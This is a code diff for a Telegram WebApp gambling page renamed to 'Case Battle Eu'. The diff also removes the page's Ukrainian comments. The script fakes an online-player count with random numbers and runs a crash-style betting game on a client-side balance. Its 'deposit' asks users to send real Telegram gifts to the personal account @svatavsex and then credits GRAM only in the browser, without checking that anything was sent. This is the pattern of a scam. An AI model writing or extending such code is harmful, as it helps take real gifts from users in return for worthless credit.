@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>StonksGift 💎</title>
+    <title>Case Battle Eu 💎</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
@@ -79,7 +79,7 @@
             </div>
         </div>
         <div class="balance-box">
-            <span id="balance" class="balance-amount">0.00</span> <span style="font-size:12px; color:#60a5fa;">GRAM</span>
+            <span id="balance" class="balance-amount">25.00</span> <span style="font-size:12px; color:#60a5fa;">GRAM</span>
             <button class="deposit-btn" onclick="openDeposit()">+</button>
         </div>
     </div>
@@ -159,7 +159,6 @@
 </div>
 
 <script>
-    // Ініціалізація Telegram WebApp та профілю
     const tg = window.Telegram.WebApp;
     tg.expand();
 
@@ -171,34 +170,27 @@
         }
     }
 
-    let balance = 25.00; // Стартовий бонус для тесту
+    let balance = 25.00;
     document.getElementById('balance').innerText = balance.toFixed(2);
 
-    // Онлайн лічильник
     setInterval(() => {
         let online = 950 + Math.floor(Math.random() * 80);
         document.getElementById('online-count').innerText = online;
     }, 4000);
 
-    // Перемикання вкладок
     function switchTab(tabName, element) {
         document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
         document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
-        
         document.getElementById('tab-' + tabName).classList.add('active');
         element.classList.add('active');
     }
 
-    // Модальне вікно депозиту
     function openDeposit() { document.getElementById('deposit-modal').style.display = 'flex'; }
     function closeDeposit() { document.getElementById('deposit-modal').style.display = 'none'; }
 
-    // Надсилання подарунка на @svatavsex
     function sendGift(giftName, price) {
         if(confirm(`Надіслати подарунок "${giftName}" (${price} GRAM) на @svatavsex?`)) {
-            // Перенаправлення в телеграм на ваш акаунт
             window.open(`https://t.me/svatavsex`, '_blank');
-            // Автоматичне зарахування GRAM
             balance += price;
             document.getElementById('balance').innerText = balance.toFixed(2);
             closeDeposit();
@@ -206,7 +198,6 @@
         }
     }
 
-    // Логіка гри Ракетка
     let isPlaying = false;
     let currentMultiplier = 1.00;
     let gameInterval;
@@ -238,13 +229,11 @@
                 currentMultiplier += 0.03 + (currentMultiplier * 0.02);
                 document.getElementById('multiplier').innerText = currentMultiplier.toFixed(2) + 'x';
 
-                // Випадковий краш
                 if (Math.random() < 0.03 && currentMultiplier > 1.5) {
                     endGame(false);
                 }
             }, 100);
         } else {
-            // Забрати виграш з комісією 5%
             let rawWin = bet * currentMultiplier;
             let winWithFee = rawWin * 0.95; // Комісія 5%
             balance += winWithFee;
